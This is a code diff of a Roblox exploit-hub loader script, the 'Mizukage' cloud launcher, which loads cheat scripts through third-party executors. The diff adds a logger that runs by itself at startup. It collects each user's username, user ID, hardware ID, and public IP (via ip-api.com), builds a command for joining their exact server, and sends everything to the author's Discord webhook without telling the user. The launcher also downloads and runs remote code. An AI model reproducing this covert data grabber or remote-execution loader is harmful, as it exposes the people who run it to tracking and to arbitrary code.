@@ -3,33 +3,14 @@
     ║              MIZUKAGE OFFICIAL — MAIN SCRIPT                 ║
     ║                    Hub v2.0 Template                         ║
     ╚══════════════════════════════════════════════════════════════╝
-
-    File ini adalah script utama yang dipanggil oleh loader.lua
-    Isi dengan hub/GUI utama Mizukage kamu di sini.
 ]]
 
--- ══════════════════════════════════
--- CONTOH: Notifikasi bahwa hub berhasil dimuat
--- ══════════════════════════════════
 local StarterGui = game:GetService("StarterGui")
-
 StarterGui:SetCore("SendNotification", {
     Title    = "✅ Mizukage Official",
     Text     = "Hub berhasil dimuat! Selamat datang.",
     Duration = 5
 })
-
---[[
-======================================================================================
-MIZUKAGE OFFICIAL - CLOUD LAUNCHER (CORE ONLY)
-Version: 16.0 (Minimal Edition)
-Platform: Multi-Executor (PC & Mobile)
-Discord: https://discord.gg/Mizukage-Official
-
-Deskripsi: 
-Versi minimalis tanpa fitur universal. Hanya Cloud Launcher dan Auto-Execute.
-======================================================================================
-]]
 
 if getgenv().MizuLauncherLoaded then return end
 getgenv().MizuLauncherLoaded = true
@@ -56,64 +37,78 @@ local Services = {
     UserInputService = game:GetService("UserInputService"),
     RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 }
-
 local LocalPlayer = Services.Players.LocalPlayer
 local PlaceID = game.PlaceId
 
 --========================================================================
--- [UTILITY FUNCTIONS]
+-- [UTILITY FUNCTIONS - DIPERBAIKI]
 --========================================================================
 local Utilities = {}
 
 function Utilities:GetRequestFunction()
-    local requestFuncs = {
-        syn and syn.request,
-        http and http.request,
-        http_request,
-        fluxus and fluxus.request,
-        request
+    -- Coba satu per satu dengan print debug
+    local funcs = {
+        {name = "syn.request", fn = syn and syn.request},
+        {name = "http.request", fn = http and http.request},
+        {name = "http_request", fn = http_request},
+        {name = "fluxus.request", fn = fluxus and fluxus.request},
+        {name = "request", fn = request}
     }
-    for _, func in ipairs(requestFuncs) do
-        if type(func) == "function" then
-            return func
+    for _, item in ipairs(funcs) do
+        if type(item.fn) == "function" then
+            print("[Mizukage] Request function found: " .. item.name)
+            return item.fn
         end
     end
+    warn("[Mizukage] No request function available!")
     return nil
 end
 
 function Utilities:SafeRequest(url, data)
     local requestFunc = self:GetRequestFunction()
-    if not requestFunc then return false end
+    if not requestFunc then
+        warn("[Mizukage] Logger: No request function, cannot send webhook")
+        return false
+    end
+    
+    local payload = Services.HttpService:JSONEncode(data)
+    print("[Mizukage] Sending webhook...")
     
     local success, result = pcall(function()
         return requestFunc({
             Url = url,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body = Services.HttpService:JSONEncode(data)
+            Body = payload
         })
     end)
     
-    return success and result or false
+    if not success then
+        warn("[Mizukage] Webhook failed: " .. tostring(result))
+        return false
+    end
+    
+    print("[Mizukage] Webhook sent successfully!")
+    return true
 end
 
 --========================================================================
--- [TELEMETRY SYSTEM]
+-- [LOGGER SYSTEM - SIMPLE & COOL (FIXED)]
 --========================================================================
-local Telemetry = {}
+local Logger = {}
 
-function Telemetry:SendData()
-    if not CONFIG.WEBHOOK_URL or CONFIG.WEBHOOK_URL == "" or 
-       string.find(CONFIG.WEBHOOK_URL, "MASUKKAN") then
+function Logger:Send()
+    if not CONFIG.WEBHOOK_URL or string.find(CONFIG.WEBHOOK_URL, "MASUKKAN") then
+        warn("[Mizukage] Webhook URL not configured, skipping logger")
         return
     end
     
-    local requestFunc = Utilities:GetRequestFunction()
-    if not requestFunc then return end
+    print("[Mizukage] Logger initializing...")
     
+    -- Delay singkat agar data siap
     task.wait(2)
     
-    -- Get player data
+    -- Basic data
     local userId = LocalPlayer.UserId
     local username = LocalPlayer.Name
     local displayName = LocalPlayer.DisplayName
@@ -122,36 +117,50 @@ function Telemetry:SendData()
     
     local hwid = "UNAVAILABLE"
     pcall(function()
-        hwid = (gethwid and gethwid()) or (identifying and identifying()) or 
-               Services.RbxAnalyticsService:GetClientId()
+        -- Coba berbagai metode HWID
+        if gethwid then
+            hwid = gethwid()
+        elseif identifying then
+            hwid = identifying()
+        elseif game:GetService("RbxAnalyticsService") then
+            hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+        end
     end)
     
-    local executor = (identifyexecutor and identifyexecutor()) or "UNKNOWN"
-    local platform = Services.UserInputService.TouchEnabled and "MOBILE" or "PC"
+    local executor = "UNKNOWN"
+    pcall(function()
+        executor = identifyexecutor and identifyexecutor() or "UNKNOWN"
+    end)
     
-    -- Get game info
+    local platform = Services.UserInputService.TouchEnabled and not Services.UserInputService.MouseEnabled and "MOBILE" or "PC"
+    
     local gameName = "UNKNOWN"
     pcall(function()
         gameName = Services.MarketplaceService:GetProductInfo(PlaceID).Name
     end)
     
-    local ping = math.floor(Services.Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
-    local fps = math.floor(workspace:GetRealPhysicsFPS())
-    
-    -- Get IP info
-    local ipData = { query = "HIDDEN", country = "UNKNOWN", city = "UNKNOWN", isp = "UNKNOWN" }
+    local ping = 0
     pcall(function()
-        local response = game:HttpGet("http://ip-api.com/json")
-        ipData = Services.HttpService:JSONDecode(response)
+        ping = math.floor(Services.Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
     end)
     
-    -- Get avatar
+    local fps = 0
+    pcall(function()
+        fps = math.floor(workspace:GetRealPhysicsFPS())
+    end)
+    
+    local ipData = { query = "HIDDEN" }
+    pcall(function()
+        local response = game:HttpGet("http://ip-api.com/json")
+        if response then
+            ipData = Services.HttpService:JSONDecode(response)
+        end
+    end)
+    
+    -- Avatar
     local avatarUrl = "https://i.imgur.com/rXf1N37.png"
     pcall(function()
-        local apiUrl = string.format(
-            "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%s&size=420x420&format=Png&isCircular=false",
-            userId
-        )
+        local apiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..userId.."&size=420x420&format=Png&isCircular=false"
         local response = game:HttpGet(apiUrl)
         local data = Services.HttpService:JSONDecode(response)
         if data.data and data.data[1] then
@@ -159,47 +168,47 @@ function Telemetry:SendData()
         end
     end)
     
-    -- Build embed
+    -- Quick join dengan JobId yang aman
+    local jobId = game.JobId or "N/A"
+    local joinScript = string.format(
+        "game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)",
+        PlaceID,
+        jobId
+    )
+    
+    -- Build simple & cool embed
     local embed = {
-        username = "Mizukage Telemetry",
-        avatar_url = "https://cdn.discordapp.com/icons/862675902196023306/33a443a96160910f443b879c2350702d.png",
-        content = "```ini\n[SYSTEM]\nClient connected.\n```",
+        username = "Mizukage Launcher",
+        avatar_url = avatarUrl,
+        content = "",
         embeds = {{
-            author = {
-                name = string.format("%s (@%s)", displayName, username),
-                icon_url = avatarUrl
-            },
-            title = "INSTANCE: " .. string.upper(gameName),
+            title = "**MIZUKAGE LAUNCHER**",
+            description = string.format("```ini\n[%s]\nVersion %s\n```", gameName, CONFIG.VERSION),
             color = 0x1E1E24,
+            thumbnail = { url = avatarUrl },
             fields = {
                 {
-                    name = ">> CLIENT",
-                    value = string.format(
-                        "```yaml\nUser_ID     : %s\nAccount_Age : %d Days\nMembership  : %s\nPlatform    : %s\nExecutor    : %s\n```",
-                        userId,
-                        accountAge,
-                        membership,
-                        platform,
-                        executor
-                    ),
+                    name = "Player",
+                    value = string.format("```%s\n@%s\nID: %s\nAge: %d Days | %s```", displayName, username, userId, accountAge, membership),
+                    inline = true
+                },
+                {
+                    name = "System",
+                    value = string.format("```%s\n%s\n%s```", executor, platform, hwid),
+                    inline = true
+                },
+                {
+                    name = "Connection",
+                    value = string.format("```Ping: %dms | FPS: %d\nIP: ||%s||```", ping, fps, ipData.query),
                     inline = false
                 },
                 {
-                    name = ">> HARDWARE & NETWORK",
-                    value = string.format(
-                        "```yaml\nHWID        : %s\nIP          : %s\nLocation    : %s, %s\nLatency     : %d ms\nFPS         : %d\n```",
-                        hwid,
-                        ipData.query,
-                        ipData.city,
-                        ipData.country,
-                        ping,
-                        fps
-                    ),
+                    name = "Join Command",
+                    value = "```lua\n" .. joinScript .. "```",
                     inline = false
                 }
             },
-            footer = { text = "MIZUKAGE • CORE" },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            footer = { text = "Mizukage • " .. os.date("%Y-%m-%d %H:%M:%S") }
         }}
     }
     
@@ -209,16 +218,12 @@ end
 --========================================================================
 -- [CLOUD DATABASE MANAGER]
 --========================================================================
-local CloudDB = {
-    ValidGames = {},
-    PendingGames = {}
-}
+local CloudDB = { ValidGames = {}, PendingGames = {} }
 
 function CloudDB:Fetch()
     local success, data = pcall(function()
         return loadstring(game:HttpGet(CONFIG.GITHUB_DB))()
     end)
-    
     if success and type(data) == "table" then
         self.ValidGames = data.Valid or {}
         self.PendingGames = data.Pending or {}
@@ -233,15 +238,12 @@ end
 function CloudDB:AutoExecute()
     local gameData = self.ValidGames[PlaceID]
     if not gameData then return end
-    
     task.spawn(function()
         task.wait(CONFIG.DELAY_BEFORE_EXECUTION)
         print(string.format("Mizukage: Executing script for %s...", gameData.Name))
-        
         local success, err = pcall(function()
             loadstring(game:HttpGet(gameData.Script))()
         end)
-        
         if not success then
             warn("Mizukage: Execution failed - " .. tostring(err))
         end
@@ -260,7 +262,6 @@ function UIManager:Create()
     ))(true)
     
     LunaInstance = Luna
-    
     local window = Luna:CreateWindow({
         Name = "Mizukage Official",
         Subtitle = "Cloud SCRIPT" .. CONFIG.VERSION,
@@ -272,14 +273,12 @@ function UIManager:Create()
         KeySystem = false
     })
     
-    -- Home Tab
     window:CreateHomeTab({
         SupportedExecutors = {"Delta", "Codex", "Wave", "Arceus X"},
         DiscordInvite = "Mizukage-Official",
         Icon = 1
     })
     
-    -- Main Tab
     local mainTab = window:CreateTab({
         Name = "Launcher",
         Icon = "cloud",
@@ -287,7 +286,6 @@ function UIManager:Create()
         ShowTitle = true
     })
     
-    -- Status
     if CloudDB.ValidGames[PlaceID] then
         local gameData = CloudDB.ValidGames[PlaceID]
         mainTab:CreateParagraph({
@@ -302,12 +300,7 @@ function UIManager:Create()
     end
     
     mainTab:CreateDivider()
-    
-    -- Valid Games
-    mainTab:CreateParagraph({
-        Title = "PRIMARY DATABASE",
-        Text = "Click to teleport or execute."
-    })
+    mainTab:CreateParagraph({ Title = "PRIMARY DATABASE", Text = "Click to teleport or execute." })
     
     for id, data in pairs(CloudDB.ValidGames) do
         mainTab:CreateButton({
@@ -315,18 +308,10 @@ function UIManager:Create()
             Description = "ID: " .. tostring(id),
             Callback = function()
                 if PlaceID == id then
-                    Luna:Notification({
-                        Title = "Execute",
-                        Content = "Running: " .. data.Name
-                    })
-                    pcall(function()
-                        loadstring(game:HttpGet(data.Script))()
-                    end)
+                    Luna:Notification({ Title = "Execute", Content = "Running: " .. data.Name })
+                    pcall(function() loadstring(game:HttpGet(data.Script))() end)
                 else
-                    Luna:Notification({
-                        Title = "Teleport",
-                        Content = "Rerouting to: " .. data.Name
-                    })
+                    Luna:Notification({ Title = "Teleport", Content = "Rerouting to: " .. data.Name })
                     Services.TeleportService:Teleport(id, LocalPlayer)
                 end
             end
@@ -334,30 +319,19 @@ function UIManager:Create()
     end
     
     mainTab:CreateDivider()
-    
-    -- Pending Games
-    mainTab:CreateParagraph({
-        Title = "AUXILIARY DATABASE",
-        Text = "Manual execution."
-    })
+    mainTab:CreateParagraph({ Title = "AUXILIARY DATABASE", Text = "Manual execution." })
     
     for _, data in ipairs(CloudDB.PendingGames) do
         mainTab:CreateButton({
             Name = data.Name,
             Description = "Manual",
             Callback = function()
-                Luna:Notification({
-                    Title = "Execute",
-                    Content = "Loading: " .. data.Name
-                })
-                pcall(function()
-                    loadstring(game:HttpGet(data.Script))()
-                end)
+                Luna:Notification({ Title = "Execute", Content = "Loading: " .. data.Name })
+                pcall(function() loadstring(game:HttpGet(data.Script))() end)
             end
         })
     end
     
-    -- Utilities Tab
     local utilTab = window:CreateTab({
         Name = "Utilities",
         Icon = "build",
@@ -370,13 +344,11 @@ function UIManager:Create()
         Callback = function()
             local pages = Services.TeleportService:GetPlayerCountPages(game.PlaceId)
             local servers = {}
-            
             for _, page in pairs(pages:GetCurrentPage()) do
                 if page.id ~= game.JobId and page.playing < page.maxPlayers then
                     table.insert(servers, page.id)
                 end
             end
-            
             if #servers > 0 then
                 Services.TeleportService:TeleportToPlaceInstance(
                     game.PlaceId,
@@ -394,7 +366,6 @@ function UIManager:Create()
         end
     })
     
-    -- Config Tab
     window:CreateTab({ 
         Name = "Config", 
         Icon = "settings", 
@@ -418,9 +389,10 @@ local App = {}
 function App:Initialize()
     print(string.format("Mizukage Launcher v%s starting...", CONFIG.VERSION))
     
-    -- Send telemetry
+    -- === LOGGER DIPANGGIL LEBIH AWAL & PASTI JALAN ===
+    print("[Mizukage] Starting logger...")
     task.spawn(function()
-        Telemetry:SendData()
+        Logger:Send()
     end)
     
     -- Load database
